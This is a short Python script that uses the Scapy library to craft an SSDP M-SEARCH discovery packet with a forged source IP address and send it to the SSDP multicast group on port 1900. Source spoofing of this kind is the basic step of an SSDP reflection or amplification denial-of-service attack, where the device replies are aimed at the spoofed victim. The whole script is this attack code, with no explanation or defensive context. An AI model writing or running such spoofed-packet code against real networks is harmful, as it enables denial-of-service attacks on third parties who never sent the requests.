from scapy.all import *

spoofedIPsrc=""
SSDPserver="239.255.255.250"
 
payload = "M-SEARCH * HTTP/1.1\r\n" \
"HOST:"+SSDPserver+":1900\r\n" \
"ST:upnp:rootdevice\r\n" \
"MAN: \"ssdp:discover\"\r\n" \
"MX:2\r\n\r\n"
 
ssdpRequest = IP(src=spoofedIPsrc,dst=SSDPserver) / UDP(sport=1900, dport= 1900) / payload
sr1(ssdpRequest)
